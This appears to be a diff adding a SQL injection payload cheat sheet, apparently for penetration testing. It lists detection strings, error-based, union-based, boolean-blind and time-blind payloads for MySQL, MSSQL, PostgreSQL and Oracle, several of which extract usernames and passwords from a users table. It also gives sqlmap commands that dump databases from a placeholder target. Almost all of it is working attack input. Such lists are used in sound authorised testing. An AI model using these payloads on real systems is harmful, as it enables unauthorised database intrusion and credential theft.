@@ -1,0 +1,149 @@
+# === SQL INJECTION PAYLOADS ===
+# Test in: URL params, POST body, headers (User-Agent, Referer, X-Forwarded-For, Cookie)
+# Sorted: detection → error-based → union → blind boolean → blind time
+
+
+# ============================================================
+# DETECTION (try these first — look for errors, behavior change)
+# ============================================================
+'
+"
+`
+')
+"))
+'))
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+1 OR 1=1
+1' AND '1'='1
+1' AND '1'='2
+# Boolean confirm: same response for true, different for false = SQLi
+
+
+# ============================================================
+# ERROR-BASED
+# Use when: SQL errors are visible in response — fastest data extraction
+# MySQL only (EXTRACTVALUE/UPDATEXML)
+# ============================================================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users)))--
+
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+
+# MSSQL error-based
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+
+
+# ============================================================
+# UNION-BASED
+# Use when: query output is reflected on page — fast extraction
+# Step 1: find column count  →  Step 2: find visible col  →  Step 3: dump
+# ============================================================
+
+# Step 1 — increment until no error
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+
+# Step 1 alternative — NULL columns (increment until no error)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+
+# Step 2 — find which column is visible (swap NULL→string one at a time)
+' UNION SELECT 'VISIBLE',NULL,NULL--
+' UNION SELECT NULL,'VISIBLE',NULL--
+' UNION SELECT NULL,NULL,'VISIBLE'--
+
+# Step 3 — extract data (adjust column count to match)
+' UNION SELECT version(),NULL,NULL--
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT group_concat(username,0x3a,password),NULL,NULL FROM users--
+
+# Oracle UNION (requires FROM dual)
+' UNION SELECT NULL FROM dual--
+' UNION SELECT banner,NULL FROM v$version--
+
+# MSSQL UNION
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT name,NULL,NULL FROM sys.databases--
+
+
+# ============================================================
+# BOOLEAN-BASED BLIND
+# Use when: no output but page changes between true/false (length, content, redirect)
+# Confirm manually then automate with sqlmap --technique=B
+# ============================================================
+' AND 1=1--     (true — baseline)
+' AND 1=2--     (false — must differ from above)
+' AND (SELECT SUBSTRING(version(),1,1))='5'--
+' AND (SELECT SUBSTRING(database(),1,1))='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+
+# ============================================================
+# TIME-BASED BLIND
+# Use when: completely blind — no response difference at all
+# Confirm: response with sleep takes ~5s longer
+# Then automate with sqlmap --technique=T
+# ============================================================
+# MySQL
+' AND SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+' AND 1=1; SELECT pg_sleep(5)--
+
+# Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+
+# ============================================================
+# COMMENT SYNTAX (try all when one doesn't work)
+# ============================================================
+--
+-- -
+#
+/**/
+;--
+%23     (URL-encoded #)
+%27     (URL-encoded ')
+
+
+# ============================================================
+# SQLMAP QUICK REFERENCE
+# ============================================================
+# Basic
+sqlmap -u "http://TARGET/page?id=1" --batch --dbs
+
+# POST
+sqlmap -u "http://TARGET/login" --data="user=admin&pass=test" --batch --dbs
+
+# With cookie
+sqlmap -u "http://TARGET/page?id=1" --cookie="session=VALUE" --batch --dbs
+
+# Dump table
+sqlmap -u "http://TARGET/page?id=1" --batch -D dbname -T users --dump
+
+# Specify technique
+sqlmap -u "http://TARGET/page?id=1" --batch --technique=T --dbs
+
+# Header injection
+sqlmap -u "http://TARGET/" --headers="X-Forwarded-For: *" --batch --dbs
